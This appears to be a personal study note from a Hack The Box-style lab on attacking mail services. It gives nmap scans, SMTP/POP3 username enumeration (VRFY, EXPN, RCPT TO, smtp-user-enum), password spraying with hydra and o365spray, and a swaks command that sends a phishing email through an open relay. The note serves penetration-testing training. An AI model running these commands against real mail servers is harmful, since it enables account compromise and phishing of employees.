SMTP - **the postman who only sends letters**, not reads them.

---
## Enumeration

### Step 1 — Find the company’s mail server

```bash
host -t MX hackthebox.eu

dig mx inlanefreight.com | grep "MX" | grep -v ";"

host -t A mail1.inlanefreight.htb.
```
![[Pasted image 20251206210851.png]]

---
### Step 2 — Check ports

| Port      | Services                                                                   |
| --------- | -------------------------------------------------------------------------- |
| `TCP/25`  | SMTP Unencrypted                                                           |
| `TCP/143` | IMAP4 Unencrypted                                                          |
| `TCP/110` | POP3 Unencrypted                                                           |
| `TCP/465` | SMTP Encrypted                                                             |
| `TCP/587` | SMTP Encrypted/[STARTTLS](https://en.wikipedia.org/wiki/Opportunistic_TLS) |
| `TCP/993` | IMAP4 Encrypted                                                            |
| `TCP/995` | POP3 Encrypted                                                             |
```shell-session
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
```
![[Pasted image 20251206210905.png]]
---
### Step 3 — Try to enumerate usernames
Because _knowing valid usernames is half of hacking, after that we can just try password spraying, brute-forcing, or guess a valid password_.

| Command | What it does                     | Why attackers love it                                                     |
| ------- | -------------------------------- | ------------------------------------------------------------------------- |
| VRFY    | “Does user X exist?”             | Instant username leak.                                                    |
| EXPN    | “Show members of mailing list X” | Leaks entire employee list (DL), many companies have all, support, india. |
| RCPT TO | “Can I send mail to X?”          | If accepted → user exists.                                                |

#### Using SMTP port 25
```shell-session
telnet 10.10.110.20 25

---
VRFY www-data
252 2.0.0 www-data


VRFY new-user
550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table
```

```
telnet 10.10.110.20 25

---
EXPN john
250 2.1.0 john@inlanefreight.htb


EXPN support-team
250 2.0.0 carol@inlanefreight.htb
250 2.1.5 elisa@inlanefreight.htb
```

```
telnet 10.10.110.20 25

---
MAIL FROM:test@htb.com
it is
250 2.1.0 test@htb.com... Sender ok

RCPT TO:kate
550 5.1.1 kate... User unknown

RCPT TO:john
250 2.1.5 john... Recipient ok
```
![[Pasted image 20251206210626.png]]
#### Using POP port 3

```
telnet 10.10.110.20 110

USER john  → +OK
USER julio → -ERR
```

We can automate this using  [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum).

```bash
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7

-M: Mode
-U: List of users
-D: Domain
-t: Target
```
![[Pasted image 20251206214925.png]]

---
### **Step 4 — Password spray or brute-force**

Tools attackers use:
\# Note- Should always be updated as cloud providers always change the methods frequently.

- **Hydra** - Mostly always blocked by major cloud platforms.
- **o365spray** - For Office 365 [O365spray](https://github.com/0xZDH/o365spray)
- **MailSniper** -  For Office 365 [MailSniper](https://github.com/dafthack/MailSniper)
- **CredKing** - For Gmail / Octa  [CredKing](https://github.com/ustayready/CredKing)


Let's first validate if our target domain is using Office 365.
```shell-session
python3 o365spray.py --validate --domain msplaintext.xyz
```

Now, we can attempt to identify usernames.
```shell-session
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
```

Lets do password spraying
```shell-session
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3

-try both users and email
```
![[Pasted image 20251206221015.png]]

```shell-session
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz

-try both users and email
```


Login and read mail
![[Pasted image 20251206221946.png]]

---

## Open relay
An **open relay** is an SMTP (mail) server that **lets anyone send email to anyone** without logging in.

Check if its enabled
```bash
nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
```

If yes, Next, we can use any mail client to connect to the mail server and send our email.
```bash
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
```

